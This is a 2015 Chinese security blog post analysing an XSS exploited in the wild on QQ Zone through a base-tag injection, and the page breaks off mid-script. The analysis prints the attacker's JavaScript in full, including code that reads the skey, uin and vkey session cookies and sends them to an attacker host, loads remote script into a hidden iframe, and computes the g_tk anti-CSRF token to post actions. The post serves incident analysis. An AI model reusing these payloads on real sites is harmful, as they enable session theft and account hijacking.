<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="content-language" content="zh-cn">
    <title>qq空间某被利用的xss分析 - virusdefender's blog (＾－＾)V</title>
    <link rel="shortcut icon" href="/assets/img/favicon.ico">
    <meta name="author"  content="virusdefender">
    <meta name="description" content="学而不思则罔，思而不学则殆">
    <meta name="keywords"  content="virusdefender,blog">
    <!-- Open Graph -->
    <meta property="og:title" content="qq空间某被利用的xss分析 - virusdefender's blog (＾－＾)V">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://strcpy.me/index.php/archives/347/">
    <meta property="og:description" content="学而不思则罔，思而不学则殆">
    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
    <link rel="stylesheet" href="https://cdn.virusdefender.net/assets/css/github-markdown.css">
    <link rel="stylesheet" href="https://cdn.virusdefender.net/assets/css/prism.css">
    <link rel="stylesheet" href="https://cdn.virusdefender.net/assets/css/app.min.css">
    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
</head>

<body>
    <!--[if lt IE 10]>
<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
<![endif]-->
    <header class="g-header">
    <div class="g-logo">
        <a href="/">virusdefender's blog (＾－＾)V</a>
    </div>
    <i id="menu-toggle" class="iconfont icon-menu"></i>
    <nav class="g-nav">
        <ul>
            
            <li><a href="/">home</a></li>
            
            <li><a href="/index.php/archives/about/">about</a></li>
            
        </ul>
    </nav>
</header>


<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
    <div class="post-wrapper">
        <div class="post-tags">
             
            
            <a href="/tags/#安全" class="post-tag">安全</a>
            
            
        </div>
        <h1>qq空间某被利用的xss分析</h1>
        <div class="post-meta">
            <time class="post-meta-item" datetime="2015-07-13 10:11"><i class="iconfont icon-date"></i>2015-07-13 10:11</time>
        </div>
    </div>
</header>

<div class="post-content">
    
    <article class="markdown-body">
        <p>今天听说有些人在点击了几个花千骨的广告视频后，自己的qq空间里面就被莫名其妙的分享了一些广告，还自动添加了好友。</p>

<p>怀疑是qq空间的xss或者csrf。在对那几个视频页面进行分析后没有发现什么可疑的代码，后来在模拟了qq手机版的ua，清除了cookies，然后更换了ip后终于复现了这个问题。</p>

<p><img src="http://storage.virusdefender.net/blog/images/347/3.png" alt="QQ20150713-2@2x.png" /></p>

<p>这个域名是不是很可疑？我开始怀疑是腾讯的合作伙伴的js被篡改了，但是点看这个php，它的内容是</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"footad"</span><span class="p">).</span><span class="nx">src</span><span class="o">=</span><span class="s2">"http://yyyy.qq.com/cgi-bin/privateblog/privateblog_output_data?uin="</span><span class="o">+</span><span class="nx">rndNum</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span><span class="o">+</span><span class="s2">"&amp;blogid=12"</span><span class="o">+</span><span class="nx">rndNum</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="s2">"&amp;imgdm=xxxx.com%2fimgcache.qq.com&amp;bdm=b.qzone.qq.com&amp;vid="</span><span class="o">+</span><span class="nb">window</span><span class="p">.</span><span class="nx">vid</span><span class="p">;</span>
<span class="kd">function</span> <span class="nx">rndNum</span><span class="p">(</span><span class="nx">len</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">len</span> <span class="o">&amp;&amp;</span> <span class="nx">len</span><span class="o">&gt;</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">len</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">){}</span><span class="k">else</span><span class="p">{</span><span class="nx">len</span><span class="o">=</span><span class="mi">32</span><span class="p">;}</span>
    <span class="kd">var</span> <span class="nx">strs</span><span class="o">=</span><span class="s2">"123456789"</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">maxPos</span><span class="o">=</span><span class="nx">strs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">rdstr</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">len</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
	<span class="nx">rdstr</span><span class="o">+=</span><span class="nx">strs</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">maxPos</span><span class="p">));</span>
    <span class="p">}</span>
<span class="k">return</span> <span class="nx">rdstr</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">cookieRead</span><span class="p">){</span>
   <span class="kd">var</span> <span class="nx">dor</span><span class="o">=</span><span class="nx">cookieRead</span><span class="p">(</span><span class="s2">"adplay"</span><span class="p">);</span>
   <span class="k">if</span><span class="p">(</span><span class="nx">dor</span> <span class="o">&amp;&amp;</span> <span class="nx">dor</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
	<span class="c1">//;</span>
   <span class="p">}</span><span class="k">else</span><span class="p">{</span>
	<span class="nx">cookie_set</span><span class="p">(</span><span class="s2">"adplay"</span><span class="p">,</span><span class="mi">99</span><span class="p">);</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>对<code class="highlighter-rouge">http://yyyy.qq.com/cgi-bin/privateblog/privateblog_output_data?uin=842362834&amp;blogid=1268155622&amp;imgdm=xxxx.com%2fimgcache.qq.com&amp;bdm=b.qzone.qq.com&amp;vid=19</code>发起一个请求，当然里面有几个参数的随机生成的。</p>

<p>打开这个url，查看源代码，漏洞就是很明显的了。</p>

<p><img src="http://storage.virusdefender.net/blog/images/347/4.png" alt="1368966902.png" /></p>

<p>base标签里面抹掉的那个域名和url里面的抹掉的那个域名是一样的，典型的xss漏洞。因为base标签是可以改变下面的相对路径的，比如html在qq.com域下，而base里面是baidu.com，那么下面的<code class="highlighter-rouge">&lt;script src="1.js"&gt;&lt;/script&gt;</code>就会访问baidu.com/1.js，而不是qq.com/1.js，导致xss漏洞。而我发现这个地方腾讯其实是有过滤的，因为url里面直接使用xxx.com是不可以的，必须是xxx.com/cache.qq.com才行，但是这样的过滤并没有什么卵用。</p>

<p>这个<code class="highlighter-rouge">embeded.js</code>的内容是</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">{</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="o">=</span><span class="s2">"qq.com"</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
<span class="kd">function</span> <span class="nx">cookieRead</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">g</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="k">void</span> <span class="mi">0</span><span class="o">==</span><span class="nx">b</span><span class="p">){</span><span class="nx">a</span><span class="o">+=</span><span class="s2">"="</span><span class="p">;</span><span class="nx">b</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">";"</span><span class="p">);</span><span class="nx">c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nx">g</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">c</span><span class="o">&lt;</span><span class="nx">g</span><span class="p">;</span><span class="nx">c</span><span class="o">++</span><span class="p">){</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="nx">b</span><span class="p">[</span><span class="nx">c</span><span class="p">];</span><span class="s2">" "</span><span class="o">==</span><span class="nx">i</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);)</span><span class="nx">i</span><span class="o">=</span><span class="nx">i</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">i</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="mi">0</span><span class="o">==</span><span class="nx">i</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">a</span><span class="p">))</span><span class="k">return</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span><span class="nx">i</span><span class="p">.</span><span class="nx">length</span><span class="p">))}</span><span class="k">return</span> <span class="s2">""</span><span class="p">}}</span>

<span class="kd">function</span> <span class="nx">cookie_set</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
	<span class="kd">var</span> <span class="nx">Then</span><span class="o">=</span><span class="k">new</span> <span class="nb">Date</span><span class="p">();</span> 
	<span class="nx">Then</span><span class="p">.</span><span class="nx">setTime</span><span class="p">(</span><span class="nx">Then</span><span class="p">.</span><span class="nx">getTime</span><span class="p">()</span><span class="o">+</span><span class="mi">7</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">1000</span><span class="p">);</span> 
	<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="nx">key</span><span class="o">+</span><span class="s2">"="</span><span class="o">+</span><span class="nx">value</span><span class="o">+</span><span class="s2">"; path=/;expires="</span><span class="o">+</span><span class="nx">Then</span><span class="p">.</span><span class="nx">toGMTString</span><span class="p">();</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">getQueryString</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span> 
	<span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s2">"(^|&amp;)"</span> <span class="o">+</span> <span class="nx">name</span> <span class="o">+</span> <span class="s2">"=([^&amp;]*)(&amp;|$)"</span><span class="p">,</span> <span class="s2">"i"</span><span class="p">);</span> 
	<span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">match</span><span class="p">(</span><span class="nx">reg</span><span class="p">);</span> 
	<span class="k">if</span> <span class="p">(</span><span class="nx">r</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="k">return</span> <span class="nx">unescape</span><span class="p">(</span><span class="nx">r</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="k">return</span> <span class="s2">""</span><span class="p">;</span> 
<span class="p">}</span> 

<span class="kd">var</span> <span class="nx">dor</span><span class="o">=</span><span class="nx">cookieRead</span><span class="p">(</span><span class="s2">"qsdone"</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nx">dor</span> <span class="o">&amp;&amp;</span> <span class="nx">dor</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
	<span class="c1">//document.location="about:blank";</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	<span class="nx">cookie_set</span><span class="p">(</span><span class="s2">"qsdone"</span><span class="p">,</span><span class="mi">99</span><span class="p">);</span>
	<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="nx">iframe_add</span><span class="p">;</span>
<span class="p">}</span>



<span class="kd">function</span> <span class="nx">iframe_add</span><span class="p">(){</span><span class="nx">tjskey</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">eframe</span><span class="p">;</span>
	<span class="k">try</span><span class="p">{</span>
		<span class="kd">var</span> <span class="nx">isie</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nb">navigator</span><span class="p">.</span><span class="nx">appName</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">().</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">"MICROSOFT"</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span>
		<span class="nx">eframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">isie</span><span class="p">?</span> <span class="s2">"&lt;iframe name='xframe'&gt;"</span><span class="p">:</span><span class="s2">"iframe"</span><span class="p">);</span>
	<span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
	<span class="k">try</span><span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">eframe</span><span class="p">){</span><span class="nx">eframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"iframe"</span><span class="p">);}</span>  
		<span class="nx">eframe</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="s2">"xframe"</span><span class="p">;</span>
		<span class="nx">eframe</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">"xframe"</span><span class="p">;</span>
		<span class="nx">eframe</span><span class="p">.</span><span class="nx">width</span><span class="o">=</span><span class="s2">"0px"</span><span class="p">;</span>
		<span class="nx">eframe</span><span class="p">.</span><span class="nx">height</span><span class="o">=</span><span class="s2">"0px"</span><span class="p">;</span>
		<span class="nx">eframe</span><span class="p">.</span><span class="nx">scrolling</span><span class="o">=</span><span class="s2">"no"</span><span class="p">;</span>
		<span class="nx">eframe</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">"frameborder"</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
		<span class="nx">eframe</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">"http://b.qzone.qq.com/proxy.html?r=0.1436745170"</span><span class="p">;</span>
		<span class="k">if</span><span class="p">(</span><span class="nx">eframe</span><span class="p">.</span><span class="nx">attachEvent</span><span class="p">){</span>
			<span class="nx">eframe</span><span class="p">.</span><span class="nx">attachEvent</span><span class="p">(</span><span class="s2">"onload"</span><span class="p">,</span><span class="nx">iframe_addjs</span><span class="p">);</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nx">eframe</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="nx">iframe_addjs</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">eframe</span><span class="p">);</span>
	<span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
<span class="p">}</span>


<span class="kd">function</span> <span class="nx">iframe_addjs</span><span class="p">(){</span> 
	<span class="kd">var</span> <span class="nx">xdoc</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">xdoc</span><span class="p">){</span><span class="k">try</span><span class="p">{</span><span class="nx">xdoc</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="s2">"xframe"</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}}</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">xdoc</span><span class="p">){</span><span class="k">try</span><span class="p">{</span><span class="nx">xdoc</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="s2">"xframe"</span><span class="p">].</span><span class="nb">document</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}}</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">xdoc</span><span class="p">){</span><span class="k">try</span><span class="p">{</span><span class="nx">xdoc</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"xframe"</span><span class="p">).</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}}</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">xdoc</span><span class="p">){</span>
		<span class="kd">var</span> <span class="nx">xjs</span><span class="o">=</span><span class="nx">xdoc</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"script"</span><span class="p">);</span>
		<span class="nx">xjs</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">"http://imgcoche.qq.xxxx.com/qq/getmore.php?r="</span><span class="o">+</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="o">+</span><span class="s2">"&amp;type=img.jpg"</span><span class="p">;</span>
		<span class="nx">xjs</span><span class="p">.</span><span class="nx">type</span><span class="o">=</span><span class="s2">"text/javascript"</span><span class="p">;</span>
		<span class="k">try</span><span class="p">{</span><span class="nx">xdoc</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'head'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">xjs</span><span class="p">);}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">tjskey</span><span class="p">(){</span>

	<span class="kd">var</span> <span class="nx">eimg</span><span class="p">;</span> 
	<span class="nx">eimg</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"img"</span><span class="p">);</span> 
	<span class="nx">eimg</span><span class="p">.</span><span class="nx">width</span><span class="o">=</span><span class="s2">"0px"</span><span class="p">;</span>
	<span class="nx">eimg</span><span class="p">.</span><span class="nx">height</span><span class="o">=</span><span class="s2">"0px"</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">myskey</span><span class="o">=</span><span class="nx">cookieRead</span><span class="p">(</span><span class="s2">"skey"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">myqq</span><span class="o">=</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">cookieRead</span><span class="p">(</span><span class="s2">"uin"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="s2">"o"</span><span class="p">,</span><span class="s2">""</span><span class="p">));</span>
	<span class="kd">var</span> <span class="nx">vkey</span><span class="o">=</span><span class="nx">cookieRead</span><span class="p">(</span><span class="s2">"vkey"</span><span class="p">);</span>	
	<span class="c1">//if(myqq&gt;500 &amp;&amp; vkey.length&gt;10){</span>
		<span class="k">if</span><span class="p">(</span><span class="nx">myqq</span><span class="o">&gt;</span><span class="mi">500</span><span class="p">){</span>
			<span class="nx">eimg</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">"http://imgcoche.qq.xxxx.com/qq/c.php?u="</span><span class="o">+</span><span class="nx">myqq</span><span class="o">+</span><span class="s2">"&amp;s="</span><span class="o">+</span><span class="nx">myskey</span><span class="o">+</span><span class="s2">"&amp;v="</span><span class="o">+</span><span class="nx">vkey</span><span class="o">+</span><span class="s2">"&amp;f="</span><span class="o">+</span><span class="nx">getQueryString</span><span class="p">(</span><span class="s2">"vid"</span><span class="p">);</span>
			<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">eimg</span><span class="p">);</span>
		<span class="p">}</span>	
	<span class="p">}</span>
</code></pre></div></div>

<p>在window.onload的时候读取cookies中的qq，key和skey等，发送到后台。</p>

<p>然后判断浏览器，创建一个iframe，src是<code class="highlighter-rouge">http://b.qzone.qq.com/proxy.html</code>，然后在这个页面写入js，地址是<code class="highlighter-rouge">http://imgcoche.qq.xxxx.com/qq/getmore.php?r="+Math.random()+"&amp;type=img.jpg";</code>。这个js的内容是</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xqq</span><span class="o">=</span><span class="s2">"19111xxxxx"</span><span class="p">;</span>


<span class="kd">var</span> <span class="nx">g_skey</span><span class="o">=</span><span class="nx">cookieRead</span><span class="p">(</span><span class="s2">"skey"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">g_tk</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nx">g_skey</span> <span class="o">&amp;&amp;</span> <span class="nx">g_skey</span><span class="p">.</span><span class="nx">length</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">){</span>
	<span class="nx">g_tk</span><span class="o">=</span><span class="nx">getGTK</span><span class="p">(</span><span class="nx">g_skey</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">g_vuin</span><span class="o">=</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">cookieRead</span><span class="p">(</span><span class="s2">"uin"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="s2">"o"</span><span class="p">,</span><span class="s2">""</span><span class="p">));</span>
	<span class="kd">var</span> <span class="nx">g_ie</span><span class="o">=</span><span class="nx">myisIE</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">g_sender</span><span class="p">;</span>
	<span class="nx">add_form</span><span class="p">();</span>
<span class="p">}</span>


<span class="kd">function</span> <span class="nx">getGTK</span><span class="p">(</span><span class="nx">str</span><span class="p">){</span>
    <span class="kd">var</span> <span class="nx">hash</span> <span class="o">=</span> <span class="mi">5381</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">){</span>
        <span class="nx">hash</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">hash</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="p">).</span><span class="nx">charCodeAt</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">hash</span> <span class="o">&amp;</span> <span class="mh">0x7fffffff</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nx">cookieRead</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">g</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="k">void</span> <span class="mi">0</span><span class="o">==</span><span class="nx">b</span><span class="p">){</span><span class="nx">a</span><span class="o">+=</span><span class="s2">"="</span><span class="p">;</span><span class="nx">b</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">";"</span><span class="p">);</span><span class="nx">c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nx">g</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">c</span><span class="o">&lt;</span><span class="nx">g</span><span class="p">;</span><span class="nx">c</span><span class="o">++</span><span class="p">){</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="nx">b</span><span class="p">[</span><span class="nx">c</span><span class="p">];</span><span class="s2">" "</span><span class="o">==</span><span class="nx">i</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);)</span><span class="nx">i</span><span class="o">=</span><span class="nx">i</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">i</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="mi">0</span><span class="o">==</span><span class="nx">i</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">a</span><span class="p">))</span><span class="k">return</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span><span class="nx">i</span><span class="p">.</span><span class="nx">length</span><span class="p">))}</span><span class="k">return</span> <span class="kc">null</span><span class="p">}}</span>

<span class="kd">function</span> <span class="nx">myisIE</span><span class="p">(){</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">.</span><span class="nx">ActiveXObject</span> <span class="o">||</span> <span class="s2">"ActiveXObject"</span> <span class="k">in</span> <span class="nb">window</span><span class="p">)</span>  
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>  
    <span class="k">else</span>  
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>  
<span class="p">}</span>  
 

<span class="kd">function</span> <span class="nx">add_form</span><span class="p">(){</span>
	<span class="kd">var</span> <span class="nx">ie</span><span class="o">=</span><span class="nx">g_ie</span><span class="p">;</span>
	<span class="k">try</span><span class="p">{</span><span class="nx">g_sender</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">ie</span><span class="p">?</span> <span class="s2">"&lt;iframe name='p'&gt;"</span><span class="p">:</span><span class="s2">"iframe"</span><span class="p">);}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
   <span class="k">try</span><span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">g_sender</span><span class="p">){</span><span class="nx">g_sender</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"iframe"</span><span class="p">);}</span>  
	<span class="nx">g_sender</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="s2">"p"</span><span class="p">;</span>
	<span class="nx">g_sender</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">"p"</span><span class="p">;</span>
	<span class="nx">g_sender</span><span class="p">.</span><span class="nx">width</span><span class="o">=</span><span class="s2">"1px"</span><span class="p">;</span>
	<span class="nx">g_sender</span><span class="p">.</span><span class="nx">height</span><span class="o">=</span><span class="s2">"1px"</span><span class="p">;</span>
	<span class="nx">g_sender</span><span class="p">.</span><span class="nx">scrolling</span><span class="o">=</span><span class="s2">"no"</span><span class="p">;</span>
	<span class="nx">g_sender</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">"frameborder"</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">g_sender</span><span class="p">.</span><span class="nx">attachEvent</span><span class="p">){</span>
    		<span class="nx">g_sender</span><span class="p">.</span><span class="nx">attachEvent</span><span class="p">(</span><span class="s2">"onload"</span><span class="p">,</span><span class="nx">sender_addjs</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nx">g_sender</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="nx">sender_addjs</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">g_sender</span><span class="p">);</span>
   <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">sender_addjs</span><span class="p">(){</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">oncepost</span><span class="p">){</span>
	<span class="kd">var</span> <span class="nx">uri</span><span class="o">=</span><span class="s2">"http://w.qzone.qq.com/cgi-bin/likes/doLike"</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">refer</span><span class="o">=</span><span class="s2">"http://user.qzone.qq.com/"</span><span class="o">+</span><span class="nx">g_vuin</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">ie</span><span class="o">=</span><span class="nx">g_ie</span><span class="p">;</span>

	<span class="kd">var</span> <span class="nx">ifrHTML</span><span class="o">=</span><span class="s1">'&lt;!DOCTYPE html&gt;&lt;html lang="zh-cn"&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;&lt;meta charset="utf-8" /&gt;'</span><span class="p">;</span>
